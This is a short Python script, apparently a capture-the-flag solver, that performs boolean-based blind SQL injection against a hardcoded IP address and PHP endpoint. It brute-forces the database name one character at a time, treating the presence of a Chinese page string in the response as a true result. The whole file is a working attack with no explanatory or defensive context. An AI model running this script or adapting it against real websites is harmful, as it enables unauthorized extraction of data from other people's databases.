#coding=utf-8 
import requests

url="http://58.240.236.231:27003/backend/content_detail.php?id="
t="数据新闻"
res=""

payload="1 and substr((select database()),{0},1)='{1}'%23"

for i in range(1,100):
    for j in range(1,126):
        foo=payload.format(i,chr(j))
        #print(foo)
        rep=requests.get(url+foo)
        if t in rep.text:
            print("[+]"+chr(j))
            res+=chr(j)
            print(res)
            break